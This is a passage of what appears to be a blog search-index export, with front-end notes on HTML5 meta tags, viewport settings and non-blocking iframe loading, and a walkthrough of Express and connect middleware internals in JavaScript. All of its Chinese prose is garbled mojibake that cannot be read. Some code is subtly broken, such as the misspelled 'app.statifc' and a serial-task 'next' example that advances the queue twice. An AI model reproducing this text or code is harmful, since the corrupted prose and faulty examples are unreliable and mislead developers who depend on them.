¼ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å®šä¹‰å±žæ€§å€¼&lt;frame/&gt; framesetä¸­çš„ä¸€ä¸ªç‰¹å®šçš„çª—å£&lt;object/&gt; æˆ–è€…æ ‡ç­¾æä¾›å‚æ•°&lt;embed/&gt; HTML5 ä¸­æ–°å¢žçš„,æ ‡ç­¾å®šä¹‰äº†ä¸€ä¸ªå®¹å™¨ï¼Œç”¨æ¥åµŒå…¥å¤–éƒ¨åº”ç”¨æˆ–è€…äº’åŠ¨ç¨‹åºï¼ˆæ’ä»¶ï¼‰&lt;keygen&gt; è¯¥å¯¹è±¡æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„æ–¹å¼æ¥éªŒè¯ç”¨æˆ·ã€‚&lt;source&gt; æ ‡ç­¾ä¸ºåª’ä½“å…ƒç´ ï¼ˆæ¯”å¦‚ å’Œ ï¼‰å®šä¹‰åª’ä½“èµ„æºã€‚ manifest å±žæ€§è§„å®šæ–‡æ¡£çš„ç¼“å­˜ manifest çš„ä½ç½®ã€‚ HTML5 å¼•å…¥äº†åº”ç”¨ç¨‹åºç¼“å­˜ï¼Œè¿™æ„å‘³ç€ Web åº”ç”¨ç¨‹åºå¯ä»¥è¢«ç¼“å­˜ï¼Œç„¶åŽåœ¨æ— äº’è”ç½‘è¿žæŽ¥çš„æ—¶å€™è¿›è¡Œè®¿é—®ã€‚ åº”ç”¨ç¨‹åºç¼“å­˜ä½¿å¾—åº”ç”¨ç¨‹åºæœ‰ä¸‰ä¸ªä¼˜ç‚¹ï¼š ç¦»çº¿æµè§ˆ - ç”¨æˆ·å¯ä»¥åœ¨ç¦»çº¿æ—¶ä½¿ç”¨åº”ç”¨ç¨‹åº å¿«é€Ÿ - ç¼“å­˜çš„èµ„æºå¯ä»¥æ›´å¿«åœ°åŠ è½½ å‡å°‘æœåŠ¡å™¨åŠ è½½ - æµè§ˆå™¨åªä»ŽæœåŠ¡å™¨ä¸Šä¸‹è½½å·²æ›´æ–°/å·²æ›´æ”¹çš„èµ„æº manifest å±žæ€§åº”è¯¥è¢« Web åº”ç”¨ç¨‹åºä¸­æ‚¨æƒ³è¦ç¼“å­˜çš„æ¯ä¸ªé¡µé¢åŒ…å«ã€‚ manifest æ–‡ä»¶æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œåˆ—ä¸¾å‡ºäº†æµè§ˆå™¨ç”¨äºŽç¦»çº¿è®¿é—®è€Œç¼“å­˜çš„èµ„æºã€‚ metaHTML å…ƒç´ è¡¨ç¤ºé‚£äº›ä¸èƒ½ç”±å…¶å®ƒHTMLå…ƒç›¸å…³å…ƒç´  (, , , æˆ– ) ä¹‹ä¸€è¡¨ç¤ºçš„ä»»ä½•å…ƒæ•°æ®ä¿¡æ¯. å…è®¸çš„çˆ¶å…ƒç´ &lt;meta charset&gt;, &lt;meta http-equiv&gt;, å…ƒç´  charset æ­¤ç‰¹æ€§å£°æ˜Žå½“å‰æ–‡æ¡£æ‰€ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ï¼Œä½†è¯¥å£°æ˜Žå¯ä»¥è¢«ä»»ä½•ä¸€ä¸ªå…ƒç´ çš„ lang ç‰¹æ€§çš„å€¼è¦†ç›–ã€‚é¼“åŠ±ä½¿ç”¨ UTF-8 1&lt;meta charset="utf-8"&gt; content å¿…éœ€çš„å±žæ€§ æ­¤å±žæ€§åŒ…å«http-equiv æˆ–name å±žæ€§çš„å€¼ï¼Œå…·ä½“å–å†³äºŽæ‰€ä½¿ç”¨çš„å€¼ã€‚ http-equiv æŠŠ content å±žæ€§å…³è”åˆ° HTTP å¤´éƒ¨ã€‚ è¿™ä¸ªæžšä¸¾å±žæ€§å®šä¹‰äº†èƒ½æ”¹å˜æœåŠ¡å™¨å’Œç”¨æˆ·å¼•æ“Žè¡Œä¸ºçš„ç¼–è¯‘ã€‚è¿™ä¸ªç¼–è¯‘å€¼ä½¿ç”¨content æ¥å®š content-type expires refresh set-cookie ä½¿ç”¨å¸¦æœ‰ http-equiv å±žæ€§çš„ æ ‡ç­¾æ—¶ï¼ŒæœåŠ¡å™¨å°†æŠŠåç§°/å€¼å¯¹æ·»åŠ åˆ°å‘é€ç»™æµè§ˆå™¨çš„å†…å®¹å¤´éƒ¨ã€‚ä¾‹å¦‚ï¼Œæ·»åŠ ï¼š 12&lt;meta http-equiv=&quot;charset&quot; content=&quot;iso-8859-1&quot;&gt;&lt;meta http-equiv=&quot;expires&quot; content=&quot;31 Dec 2008&quot;&gt; è¿™æ ·å‘é€åˆ°æµè§ˆå™¨çš„å¤´éƒ¨å°±åº”è¯¥åŒ…å«ï¼š 123content-type: text/htmlcharset:iso-8859-1expires:31 Dec 2008 å½“ç„¶ï¼Œåªæœ‰æµè§ˆå™¨å¯ä»¥æŽ¥å—è¿™äº›é™„åŠ çš„å¤´éƒ¨å­—æ®µï¼Œå¹¶èƒ½ä»¥é€‚å½“çš„æ–¹å¼ä½¿ç”¨å®ƒä»¬æ—¶ï¼Œè¿™äº›å­—æ®µæ‰æœ‰æ„ä¹‰ã€‚ â€œcontent-security-policyâ€å†…å®¹å®‰å…¨ç­–ç•¥ å®ƒå…è®¸é¡µé¢ä½œè€…å®šä¹‰å½“å‰é¡µçš„ å†…å®¹ç­–ç•¥ã€‚ å†…å®¹ç­–ç•¥ä¸»è¦æŒ‡å®šå…è®¸çš„æœåŠ¡å™¨æºå’Œè„šæœ¬ç«¯ç‚¹ï¼Œè¿™æœ‰åŠ©äºŽé˜²æ­¢è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ã€‚ default-style è¿™ä¸ªå±žæ€§æŒ‡å®šäº†åœ¨é¡µé¢ä¸Šä½¿ç”¨çš„é¦–é€‰æ ·å¼è¡¨. contentå±žæ€§å¿…é¡»åŒ…å« å…ƒç´ çš„æ ‡é¢˜, hrefå±žæ€§é“¾æŽ¥åˆ°CSSæ ·å¼è¡¨æˆ–åŒ…å«CSSæ ·å¼è¡¨çš„å…ƒç´ çš„æ ‡é¢˜. refresh è¿™ä¸ªå±žæ€§æŒ‡å®š: å¦‚æžœcontent åªåŒ…å«ä¸€ä¸ªæ­£æ•´æ•°,åˆ™æ˜¯é‡æ–°è½½å…¥é¡µé¢çš„æ—¶é—´é—´éš”(ç§’); å¦‚æžœcontent åŒ…å«ä¸€ä¸ªæ­£æ•´æ•°å¹¶ä¸”è·Ÿç€ä¸€ä¸ªå­—ç¬¦ä¸²,åˆ™æ˜¯é‡å®šå‘åˆ°æŒ‡å®šé“¾æŽ¥çš„æ—¶é—´é—´éš”(ç§’) 12&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;&lt;meta http-equiv="refresh" content="3;url=http://www.mozilla.org/"&gt; name æŠŠ content å±žæ€§å…³è”åˆ°ä¸€ä¸ªåç§°ã€‚ author description keywords generator revised others name å±žæ€§æä¾›äº†åç§°/å€¼å¯¹ä¸­çš„åç§°ã€‚HTML å’Œ XHTML æ ‡ç­¾éƒ½æ²¡æœ‰æŒ‡å®šä»»ä½•é¢„å…ˆå®šä¹‰çš„ åç§°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥è‡ªç”±ä½¿ç”¨å¯¹è‡ªå·±å’Œæºæ–‡æ¡£çš„è¯»è€…æ¥è¯´å¯Œæœ‰æ„ä¹‰çš„åç§°ã€‚ â€œkeywordsâ€ æ˜¯ä¸€ä¸ªç»å¸¸è¢«ç”¨åˆ°çš„åç§°ã€‚å®ƒä¸ºæ–‡æ¡£å®šä¹‰äº†ä¸€ç»„å…³é”®å­—ã€‚æŸäº›æœç´¢å¼•æ“Žåœ¨é‡åˆ°è¿™äº›å…³é”®å­—æ—¶ï¼Œä¼šç”¨è¿™äº›å…³é”®å­—å¯¹æ–‡æ¡£è¿›è¡Œåˆ†ç±»ã€‚ ç±»ä¼¼è¿™æ ·çš„ meta æ ‡ç­¾å¯èƒ½å¯¹äºŽè¿›å…¥æœç´¢å¼•æ“Žçš„ç´¢å¼•æœ‰å¸®åŠ©ï¼š 1&lt;meta name=&quot;keywords&quot; content=&quot;HTML,ASP,PHP,SQL&quot;&gt; å¦‚æžœæ²¡æœ‰æä¾› name å±žæ€§ï¼Œé‚£ä¹ˆåç§°/å€¼å¯¹ä¸­çš„åç§°ä¼šé‡‡ç”¨ http-equiv å±žæ€§çš„å€¼ã€‚ è¯¥å±žæ€§å®šä¹‰æ–‡æ¡£çº§å…ƒæ•°æ®çš„åç§°ã€‚å¦‚æžœä»¥ä¸‹å…¶ä¸­ä¸€ä¸ªå±žæ€§è®¾ç½®äº†itemprop, http-equiv or charset ï¼Œå°±ä¸èƒ½åœ¨è®¾ç½®è¿™ä¸ªå±žæ€§äº†ã€‚ æ­¤å…ƒæ•°æ®åç§°ä¸Ž å±žæ€§åŒ…å«çš„å€¼ç›¸å…³è”ã€‚nameå±žæ€§çš„å¯èƒ½å€¼ä¸ºï¼š 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&quot;&gt; viewport, å®ƒæä¾›æœ‰å…³è§†å£åˆå§‹å¤§å°çš„æç¤ºï¼Œä»…ä¾›ç§»åŠ¨è®¾å¤‡ä½¿ç”¨ã€‚å€¼çš„å†…å®¹ä¸ºï¼š Valueå¯èƒ½å€¼æè¿°widthä¸€ä¸ªæ­£æ•´æ•°æˆ–è€…å­—ç¬¦ä¸² device-widthä»¥pixelsï¼ˆåƒç´ ï¼‰ä¸ºå•ä½ï¼Œ å®šä¹‰viewportï¼ˆè§†å£ï¼‰çš„å®½åº¦ã€‚ heightä¸€ä¸ªæ­£æ•´æ•°æˆ–è€…å­—ç¬¦ä¸² device-heightä»¥pixelsï¼ˆåƒç´ ï¼‰ä¸ºå•ä½ï¼Œ å®šä¹‰viewportï¼ˆè§†å£ï¼‰çš„é«˜åº¦ã€‚ initial-scaleä¸€ä¸ª0.0 åˆ°10.0ä¹‹é—´çš„æ­£æ•°å®šä¹‰è®¾å¤‡å®½åº¦ï¼ˆçºµå‘æ¨¡å¼ä¸‹çš„è®¾å¤‡å®½åº¦æˆ–æ¨ªå‘æ¨¡å¼ä¸‹çš„è®¾å¤‡é«˜åº¦ï¼‰ä¸Žè§†å£å¤§å°ä¹‹é—´çš„ç¼©æ”¾æ¯”çŽ‡ã€‚ maximum-scaleä¸€ä¸ª0.0 åˆ°10.0ä¹‹é—´çš„æ­£æ•°å®šä¹‰ç¼©æ”¾çš„æœ€å¤§å€¼ï¼›å®ƒå¿…é¡»å¤§äºŽæˆ–ç­‰äºŽminimum-scaleçš„å€¼ï¼Œä¸ç„¶ä¼šå¯¼è‡´ä¸ç¡®å®šçš„è¡Œä¸ºå‘ç”Ÿã€‚ minimum-scaleä¸€ä¸ª0.0 åˆ°10.0ä¹‹é—´çš„æ­£æ•°å®šä¹‰ç¼©æ”¾çš„æœ€å°å€¼ï¼›å®ƒå¿…é¡»å°äºŽæˆ–ç­‰äºŽmaximum-scaleçš„å€¼ï¼Œä¸ç„¶ä¼šå¯¼è‡´ä¸ç¡®å®šçš„è¡Œä¸ºå‘ç”Ÿã€‚ user-scalableä¸€ä¸ªå¸ƒå°”å€¼ï¼ˆyesæˆ–è€…noï¼‰å¦‚æžœè®¾ç½®ä¸º noï¼Œç”¨æˆ·å°†ä¸èƒ½æ”¾å¤§æˆ–ç¼©å°ç½‘é¡µã€‚é»˜è®¤å€¼ä¸º yesã€‚ https://www.cnblogs.com/2050/p/3877280.html h5 åœ¨å­˜å‚¨æ–¹é¢æä¾›äº†sessionStorage ã€localStorageå’Œç¦»çº¿å­˜å‚¨ï¼Œé€šè¿‡è¿™äº›å­˜å‚¨æ–¹å¼æ–¹ä¾¿æ•°æ®åœ¨å®¢æˆ·ç«¯çš„å­˜å‚¨å’ŒèŽ·å–ï¼Œåœ¨å¤šåª’ä½“æ–¹é¢è§„å®šäº†éŸ³é¢‘å’Œè§†é¢‘å…ƒç´ audioå’Œvedioï¼› å¦å¤–è¿˜æœ‰åœ°ç†å®šä½ã€canvasç”»å¸ƒã€æ‹–æ”¾ã€å¤šçº¿ç¨‹ç¼–ç¨‹çš„web workerså’Œwebsocketåè®® H5 canvas SVG iframesæˆ‘ä»¬ä¼šç»å¸¸ä½¿ç”¨iframesæ¥åŠ è½½ç¬¬ä¸‰æ–¹çš„å†…å®¹ã€å¹¿å‘Šæˆ–è€…æ’ä»¶ã€‚ä½¿ç”¨iframeæ˜¯å› ä¸ºå®ƒå¯ä»¥å’Œä¸»é¡µé¢å¹¶è¡ŒåŠ è½½ï¼Œä¸ä¼šé˜»å¡žä¸»é¡µé¢ã€‚ ä¸€ã€ä½¿ç”¨iframeçš„ä¼˜ç¼ºç‚¹ä¼˜ç‚¹:1.ç¨‹åºè°ƒå…¥é™æ€é¡µé¢æ¯”è¾ƒæ–¹ä¾¿;2.é¡µé¢å’Œç¨‹åºåˆ†ç¦»;ç¼ºç‚¹ï¼š1.iframeæœ‰ä¸å¥½ä¹‹å¤„ï¼šæ ·å¼/è„šæœ¬éœ€è¦é¢å¤–é“¾å…¥ï¼Œä¼šå¢žåŠ è¯·æ±‚ã€‚å¦å¤–ç”¨jsé˜²ç›—é“¾åªé˜²å¾—äº†å°å·ï¼Œé˜²ä¸äº†å¤§ç›—ã€‚2.iframeå¥½åœ¨èƒ½å¤ŸæŠŠåŽŸå…ˆçš„ç½‘é¡µå…¨éƒ¨åŽŸå°ä¸åŠ¨æ˜¾ç¤ºä¸‹æ¥,ä½†æ˜¯å¦‚æžœç”¨åœ¨é¦–é¡µ,æ˜¯æœç´¢å¼•æ“Žæœ€è®¨åŽŒçš„.é‚£ä¹ˆä½ çš„ç½‘ç«™å³ä½¿åšçš„åœ¨å¥½,ä¹ŸæŽ’ä¸åˆ°å¥½çš„åæ¬¡!å¦‚æžœæ˜¯åŠ¨æ€ç½‘é¡µï¼Œç”¨includeè¿˜å¥½ç‚¹ï¼ä½†æ˜¯å¿…é¡»è¦åŽ»é™¤ä»–çš„æ ‡ç­¾ï¼3.æ¡†æž¶ç»“æž„æœ‰æ—¶ä¼šè®©äººæ„Ÿåˆ°è¿·æƒ‘ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤šä¸ªæ¡†æž¶ä¸­éƒ½å‡ºçŽ°ä¸Šä¸‹ã€å·¦å³æ»šåŠ¨æ¡çš„æ—¶å€™ã€‚è¿™äº›æ»šåŠ¨æ¡é™¤äº†ä¼šæŒ¤å å·²ç»ç‰¹åˆ«æœ‰é™çš„é¡µé¢ç©ºé—´å¤–ï¼Œè¿˜ä¼šåˆ†æ•£è®¿é—®è€…çš„ç•™å¿ƒåŠ›ã€‚è®¿é—®è€…é‡åˆ°è¿™ç§ç«™ç‚¹å¾€å¾€ä¼šç«‹åˆ»è½¬èº«ç¦»å¼€ã€‚ä»–ä»¬ä¼šæƒ³ï¼Œæ—¢ç„¶ä½ çš„ä¸»é¡µå¦‚æ­¤æ··ä¹±ï¼Œé‚£ä¹ˆç«™ç‚¹çš„å…¶ä»–éƒ¨åˆ†ä¹Ÿè®¸æ›´ä¸å€¼å¾—é˜…è¯»ã€‚4.é“¾æŽ¥å¯¼èˆªç–‘é—®ã€‚è¿ç”¨æ¡†æž¶ç»“æž„æ—¶ï¼Œä½ å¿…é¡»ä¿è¯æ­£ç¡®é…ç½®æ‰€æœ‰çš„å¯¼èˆªé“¾æŽ¥ï¼Œå¦‚ä¸ç„¶ï¼Œä¼šç»™è®¿é—®è€…å¸¦æ¥å¾ˆå¤§çš„éº»çƒ¦ã€‚æ¯”å¦‚è¢«é“¾æŽ¥çš„é¡µé¢å‡ºçŽ°åœ¨å¯¼èˆªæ¡†æž¶å†…ï¼Œè¿™ç§æƒ…å†µä¸‹è®¿é—®è€…ä¾¿è¢«é™·ä½äº†ï¼Œå› ä¸ºæ­¤æ—¶ä»–æ²¡æœ‰å…¶ä»–åœ°ç‚¹å¯åŽ»ã€‚5.è°ƒç”¨å¤–éƒ¨é¡µé¢,éœ€è¦é¢å¤–è°ƒç”¨css,ç»™é¡µé¢å¸¦æ¥é¢å¤–çš„è¯·æ±‚æ¬¡æ•°; ä¸»é¡µé¢å’Œiframeå…±äº«åŒä¸€ä¸ªè¿žæŽ¥æ±  iframeä¼šé˜»å¡žä¸»é¡µé¢çš„onloadäº‹ä»¶ window çš„ onload äº‹ä»¶éœ€è¦åœ¨æ‰€æœ‰ iframe åŠ è½½å®Œæ¯•åŽ(åŒ…å«é‡Œé¢çš„å…ƒç´ )æ‰ä¼šè§¦å‘ã€‚åœ¨ Safari å’Œ Chrome é‡Œï¼Œé€šè¿‡ JavaScript åŠ¨æ€è®¾ç½® iframe çš„ SRC å¯ä»¥é¿å…è¿™ç§é˜»å¡žæƒ…å†µã€‚ æ€Žæ ·åšåˆ°iframeæ— é˜»å¡žåŠ è½½onloadï¼Ÿ Meeboçš„ä¸¤ä¸ªå·¥ç¨‹å¸ˆ(@marcuswestin and Martin Hunt)åšäº†ä¸€ä¸ªå…³äºŽä»–ä»¬çš„Meebo Barçš„æ¼”è®²ã€‚ä»–ä»¬ä½¿ç”¨iframeæ¥åŠ è½½ä¸€äº›æ’ä»¶ï¼Œå¹¶ä¸”çœŸæ­£åšåˆ°äº†æ— é˜»å¡žåŠ è½½ã€‚å¯¹äºŽæœ‰çš„å¼€å‘è€…æ¥è¯´ï¼Œä»–ä»¬çš„åšæ³•è¿˜æ¯”è¾ƒæ–°é²œã€‚å¾ˆèµžï¼Œè¶…çº§èµžã€‚ 123456&lt;script&gt; (function(d) &#123; var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document; // style the iframe with some CSS iframe.style.cssText ="position:absolute;width:200px;height:100px;left:0px;"; doc.open().write('&lt;body Î¿nlÎ¿ad="'+ 'var d = document;d.getElementsByTagName(\'head\')[0].'+ 'appendChild(d.createElement(\'script\')).src'+'=\'\/path\/to\/file\'"&gt;'); doc.close(); //iframe onload event happens &#125;)(document);&lt;/script&gt; ç¥žå¥‡çš„åœ°æ–¹å°±åœ¨:è¿™ä¸ªiframeä¸€å¼€å§‹æ²¡æœ‰å†…å®¹ï¼Œæ‰€ä»¥onloadä¼šç«‹å³è§¦å‘ã€‚ç„¶åŽä½ åˆ›å»ºä¸€ä¸ªscriptå…ƒç´ ï¼Œç”¨ä»–æ¥åŠ è½½å†…å®¹ã€å¹¿å‘Šã€æ’ä»¶ä»€ä¹ˆçš„ï¼Œç„¶åŽå†æŠŠè¿™ä¸ªscriptæ·»åŠ åˆ°HEADä¸­åŽ»ï¼Œè¿™æ ·iframeå†…å®¹çš„åŠ è½½å°±ä¸ä¼šé˜»å¡žä¸»é¡µé¢çš„onloadï¼L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false}); https://blog.csdn.net/fs821031547/article/details/51821095]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Fexpress%2F</url>
    <content type="text"><![CDATA[å‰è¨€ expressæž„é€ çš„æ˜¯Http.createServerçš„å›žè°ƒå‡½æ•°expressæ˜¯ä¸€ä¸ªåŸºäºŽNodeJSçš„æ¡†æž¶ï¼Œå…ˆæ¥çœ‹ä¸‹å¦‚æžœä¸ä½¿ç”¨æ¡†æž¶è¦åˆ›å»ºä¸€ä¸ªæœ€ç®€å•çš„webåº”ç”¨åº”è¯¥æ˜¯æ€Žä¹ˆæ · 12345const http = require('http');const server = http.createServer(function(req, res)&#123; res.end('hello word!')&#125;);server.listen(8000); å®žé™…ä¸Šexpressæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿è¡ŒåŽå¯ä»¥æž„é€ å‡ºä¸Šé¢ä»£ç ä¸­http.createServerçš„å›žè°ƒå‡½æ•°ï¼Œexpressåšçš„ä¸€åˆ‡æ–‡ç« éƒ½æ˜¯åœ¨è¿™ä¸ªå›žè°ƒå‡½æ•°ä¸Šã€‚æ¥çœ‹ä¸‹express3.xçš„æºç express.js 12345678910111213141516171819202122232425262728293031//========== ä½ çš„åº”ç”¨ app.js ==================const http = require('http')const app = express()app.get('/', (req, res) =&gt; res.send('Hello World!'))const server = http.createServer(app)server.listen(8000);//========== express.js =============var connect = require('connect')function createApplication() &#123; var app = connect(); utils.merge(app, proto); app.request = &#123; __proto__: req &#125;; app.response = &#123; __proto__: res &#125;; app.init(); return app;&#125;module.exports = createApplication;//=========== expressä¾èµ–çš„connect.js==============function createServer() &#123; function app(req, res, next)&#123; app.handle(req, res, next); &#125; // ... çœç•¥ return app;&#125;module.exports = createServer; connect.jsçš„å…·ä½“å†…å®¹å…ˆä¸å…³å¿ƒï¼ŒåŽé¢ä¼šé‡ç‚¹ä»‹ç»ã€‚å¯ä»¥çœ‹å‡ºconnectæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿è¡Œè¿”å›žä¸€ä¸ªappï¼Œappæ˜¯ä¸€ä¸ªå½¢å¦‚function(req, res , next){ â€¦ } çš„å‡½æ•°ã€‚expressçš„createApplicationè¿”å›žå³æ˜¯æ­¤appï¼Œç”¨äºŽhttp.createServerçš„å›žè°ƒã€‚å¹¶åœ¨è¿™ä¸ªå‡½æ•°ä¸Šæ··å…¥çš„è®¸å¤šèƒ½åŠ›ï¼Œå¦‚reqã€resçš„å¤„ç†ã€æ¨¡æ¿å¼•æ“Žã€é™æ€æ–‡ä»¶æœåŠ¡ã€routerçš„èƒ½åŠ›ã€‚ ç”¨æ¯”è¾ƒç®€å•çš„ä¼ªä»£ç è¡¨ç¤ºå¦‚ä¸‹ 12345678910111213141516171819202122const app = express();// nodejså¯åŠ¨æ—¶ï¼Œappå‡½æ•°å†…éƒ¨è¢«expresså¢žåŠ äº†èƒ½åŠ›ï¼Œå¦‚ä¸­é—´ä»¶çš„è°ƒç”¨ app.use(middleware)ï¼› // ä¸­é—´ä»¶ app.use(router)ï¼› // è·¯ç”± app.engine('ejs'); // æ¨¡æ¿å¼•æ“Ž app.statifc('public') // é™æ€æ–‡ä»¶æœåŠ¡ // ... è¿˜æœ‰ä»£ç†ä»¥åŠå…¶ä»–è®¸å¤šå±žæ€§ä¸Žæ–¹æ³•const server = http.createServer( function app(req, res)&#123; // æ­¤appå‡½æ•°å³ä¸ºexpressæ‰€æž„é€  // httpè¯·æ±‚æ—¶ï¼Œreqï¼Œ resè¢«æ··å…¥è®¸å¤šå±žæ€§ä¸Žæ–¹æ³•ï¼Œåšäº†å¾ˆå¤šå¤„ç† // ä¸²è¡ŒåŒ¹é…è¿è¡ŒæŒ‰é¡ºåºæ³¨å†Œçš„å„æ³¨å†Œçš„ä¸­é—´ä»¶å¦‚ï¼š // 1ã€æ—¥å¿—ã€cookieã€bodyparserç­‰å¼€å‘è€…è‡ªå·±æ³¨å†Œçš„ä¸­é—´ä»¶ // 2ã€routerä¸­é—´ä»¶ // 3ã€é™æ€æ–‡ä»¶æœåŠ¡ // 4ã€æ¨¡æ¿å¼•æ“Žå¤„ç† // ç»è¿‡åŒ¹é…çš„ä¸­é—´ä»¶å¤„ç†åŽè¾“å‡ºè¿”å›ž &#125;);server.listen(8000); ä¸Šé¢çš„1ã€2ã€3ã€4é¡ºåºå³ä¸ºå¼€å‘è€…æ³¨å†Œæ—¶çš„é¡ºåºï¼ˆæ•…æˆ‘ä»¬å¹³æ—¶åœ¨å¼€å‘æ—¶expressæ³¨å†Œä¸­é—´ä»¶æ—¶æ˜¯æœ‰å…ˆåŽé¡ºåºçš„ï¼‰ã€‚expressæœ€ä¸»ç®¡ç†ä¸Žè¿è¡Œä¸­é—´ä»¶çš„èƒ½åŠ›ï¼ŒæŽ¥ä¸‹æ¥æ·±å…¥å†…éƒ¨çœ‹çœ‹connectè¿™ä¸ªä¸­é—´ä»¶æœºåˆ¶æ˜¯æ€Žä¹ˆå®žçŽ°çš„ã€‚ æœ€ä¸ºæ ¸å¿ƒçš„ä¸­é—´ä»¶æ¡†æž¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//connect.js çš„ç®€è¦å†…å®¹function createServer()&#123; // appæ˜¯ç”¨äºŽhttp.createServerçš„å›žè°ƒå‡½æ•° function app(req, res, next)&#123; // è¿è¡Œæ—¶è°ƒç”¨handleå‡½æ•° app.handle(req, res, next); &#125; mixin(app, proto, false); // åˆå§‹åŒ–ä¸€ä¸ªstackæ•°ç»„ app.stack = []; return app;&#125;// useè°ƒç”¨æ—¶å¾€appçš„stackæ•°ç»„ä¸­pushä¸€ä¸ªå¯¹è±¡ï¼ˆä¸­é—´ä»¶ï¼‰ï¼Œæ ‡è¯†pathä¸Žå›žè°ƒå‡½æ•°proto.use = function(route, fn)&#123; var path = route, handle = fn; //... çœç•¥å…¶ä»– this.stack.push(&#123; route: path, handle &#125;);&#125;;// handleæ–¹æ³•ï¼Œä¸²è¡Œå–å‡ºstackæ•°ç»„ä¸­çš„ä¸­é—´ä»¶ï¼Œé€ä¸ªè¿è¡Œproto.handle = function(req, res, out)&#123; var index = 0; var stack = this.stack; var done = out || finalhandler(req, res, &#123; onerror: logerror &#125;); // éåŽ†stackï¼Œé€ä¸ªå–å‡ºä¸­é—´ä»¶è¿è¡Œ function next(err)&#123; var layer = stack[index++]; // éåŽ†å®Œæˆä¸ºæ­¢ if(layer === undefined)&#123; return done(); &#125; var route = pathFormat(layer.route); var pathname = pathFormat(urlParser(req.url).pathname || '/'); // åŒ¹é…ä¸­é—´ä»¶ï¼Œä¸åŒ¹é…çš„ä¸è¿è¡Œ if(route !== '' &amp;&amp; pathname !== route)&#123; next(err); return; &#125; // è°ƒç”¨ä¸­é—´ä»¶ call(layer.handle, err, req, res, next); &#125; next();&#125;; ä¸éš¾çœ‹å‡ºï¼Œapp.useä¸­é—´ä»¶æ—¶ï¼Œåªæ˜¯æŠŠå®ƒæ”¾å…¥ä¸€ä¸ªæ•°ç»„ä¸­ã€‚å½“httpè¯·æ±‚æ—¶ï¼Œappä¼šä»Žæ•°ç»„ä¸­é€ä¸ªå–å‡ºï¼Œè¿›è¡ŒåŒ¹é…è¿‡æ»¤ï¼Œé€ä¸ªè¿è¡Œã€‚éåŽ†å®ŒæˆåŽï¼Œè¿è¡Œfinalhandlerï¼Œç»“æŸä¸€ä¸ªhttpè¯·æ±‚ã€‚å¯ä»¥ä»Žhttpè¯·æ±‚çš„è§’åº¦æ€è€ƒï¼Œä¸€æ¬¡è¯·æ±‚å®ƒç»åŽ†ç»åŽ†äº†å¤šå°‘ä¸œè¥¿ã€‚expressçš„è¿™ä¸ªä¸­é—´ä»¶æž¶æž„å°±æ˜¯è´Ÿè´£ç®¡ç†ä¸Žè°ƒç”¨è¿™äº›æ³¨å†Œçš„ä¸­é—´ä»¶ã€‚ä¸­é—´ä»¶é¡ºåºæ‰§è¡Œï¼Œé€šè¿‡nextæ¥ç»§ç»­ä¸‹ä¸€ä¸ªï¼Œä¸€æ—¦æ²¡æœ‰ç»§ç»­nextï¼Œåˆ™æµç¨‹ç»“æŸã€‚ æŽ¥ä¸‹æ¥æä¸€ä¸‹å¼‚æ­¥ç¼–ç¨‹çš„ä¸²è¡ŒæŽ§åˆ¶ï¼ŒåŠ å¼ºç†è§£ï¼› å¼‚æ­¥ä¸²è¡Œæµç¨‹æŽ§åˆ¶ä¸ºäº†ç”¨ä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶è®©å‡ ä¸ªå¼‚æ­¥ä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œéœ€è¦å…ˆæŠŠè¿™äº›ä»»åŠ¡æŒ‰é¢„æœŸçš„æ‰§è¡Œé¡ºåºæ”¾ åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ã€‚å¦‚å›¾ï¼Œæ‰€ç¤ºï¼Œè¿™ä¸ªæ•°ç»„å°†èµ·åˆ°é˜Ÿåˆ—çš„ä½œç”¨:å®Œæˆä¸€ä¸ªä»»åŠ¡åŽæŒ‰é¡ºåºä»Žæ•°ç»„ä¸­å– å‡ºä¸‹ä¸€ä¸ª æ•°ç»„ä¸­çš„æ¯ä¸ªä»»åŠ¡éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ä»»åŠ¡å®ŒæˆåŽåº”è¯¥è°ƒç”¨ä¸€ä¸ªå¤„ç†å™¨å‡½æ•°ï¼Œå‘Šè¯‰å®ƒé”™è¯¯çŠ¶æ€å’Œ ç»“æžœã€‚å¦‚æžœæœ‰é”™è¯¯ï¼Œå¤„ç†å™¨å‡½æ•°ä¼šç»ˆæ­¢æ‰§è¡Œ;å¦‚æžœæ²¡æœ‰é”™è¯¯ï¼Œå¤„ç†å™¨å°±ä»Žé˜Ÿåˆ—ä¸­å–å‡ºä¸‹ä¸€ä¸ªä»»åŠ¡ æ‰§è¡Œå®ƒ ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•å®žçŽ°æ–¹æ¡ˆï¼š 1234567891011121314151617181920212223242526// æ•°ç»„var tasks = [ function A()&#123; //... next(); &#125;, function B()&#123; //... next() &#125;, function C()&#123; //... next() &#125; //...];function next(err, result)&#123; if(err) throw err; var currentTask = tasks.shift(); if(currentTask) currentTask(result) next();&#125;// é¦–æ¬¡ä¸»åŠ¨è°ƒç”¨next(); 